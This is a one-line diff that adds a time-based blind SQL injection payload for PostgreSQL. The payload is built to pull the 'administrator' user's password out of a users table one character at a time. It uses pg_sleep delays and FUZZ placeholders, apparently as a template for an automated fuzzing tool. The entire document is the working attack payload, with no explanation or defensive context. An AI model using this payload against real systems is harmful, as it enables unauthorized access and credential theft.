@@ -1,0 +1,1 @@
+1' || (SELECT pg_sleep(3) FROM users WHERE username='administrator' AND SUBSTR(password,FUZZ1,1)>='FUZZ2') --
